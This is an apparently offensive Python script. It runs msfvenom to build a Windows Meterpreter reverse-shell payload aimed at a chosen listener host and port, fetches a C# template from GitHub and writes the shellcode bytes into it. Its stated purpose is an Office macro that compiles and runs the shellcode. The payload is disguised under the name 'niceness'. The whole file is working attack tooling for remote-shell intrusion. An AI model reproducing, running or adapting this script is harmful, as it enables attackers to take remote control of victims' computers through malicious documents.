#example usage: python macropscsgen.py -a x64 -P tcp -l x.x.x.x -p 554

import argparse
import base64
import subprocess
import urllib2
import random
import string
from itertools import *

tmpNicenessFile = 'tmpshell.txt'
outputFile = 'mmniceness.cs'

def grabCSTemplate():
    response = urllib2.urlopen('https://raw.githubusercontent.com/fullmetalcache/CsharpMMNiceness/master/niceness_template.cs')
    script = response.read()

    return script

def injectNiceness(script, nicenessFile, outfile):

    fin = open(nicenessFile)
    niceBytes = []
    for line in fin:
        line = line.rstrip()
        bytes_curr = line.split(", ")
    
        for byte in bytes_curr:
            byte = byte.split(",")[0]
            niceBytes.append(byte)

    fout = open(outfile, 'w')
    scriptLines = script.split("\n")

    for line in scriptLines:
        if '$$$LENGTH$$$' in line:
          line = line.replace('$$$LENGTH$$$', "{0};\n".format(len(niceBytes)))

        elif '$$$NICENESS$$$' in line:
            line = ""

            idx = 0
            for byte in niceBytes:
                fout.write("mmva.Write({0}, ((byte){1}));\n".format(idx, byte))
                idx += 1

        fout.write(line + '\n')

    fout.close()

def createNiceness(arch, protocol, lhost, lport, single, outfile):
    msfCall = 'msfvenom'
    msfPayload = 'windows/'

    if arch == 'x64':
        msfPayload += 'x64/'

    if single == True:
        msfPayload += 'meterpreter_reverse_' + protocol
    else:
        msfPayload += 'meterpreter/reverse_' + protocol
    
    msfLhost = 'lhost=' + lhost
    msfLport = 'lport=' + lport

    msfFormat = "num"
    msfOut = outfile

    subprocess.check_output([msfCall, '-p', msfPayload, msfLhost, msfLport, '-f', msfFormat, '-o',msfOut])

if __name__== "__main__":
    parser = argparse.ArgumentParser(description='Generate Office Macro that writes, compiles, and runs a C# shell code program')

    parser.add_argument('-a', '--arch', choices=['x86',  'x64'], required=True, help='Target Architecture')
    parser.add_argument('-P', '--protocol', choices=['http', 'https', 'tcp'], required=True, help='Payload protocol')
    parser.add_argument('-l', '--lhost', required=True, help='Listener Host')
    parser.add_argument('-p', '--lport', required=True, help='Listener Port')
    parser.add_argument('-s', '--single', action='store_true', help='Use a single-stage payload')
    args = parser.parse_args()

    createNiceness( args.arch, args.protocol, args.lhost, args.lport, args.single, tmpNicenessFile )
    template = grabCSTemplate()
    injectNiceness( template, tmpNicenessFile, outputFile )
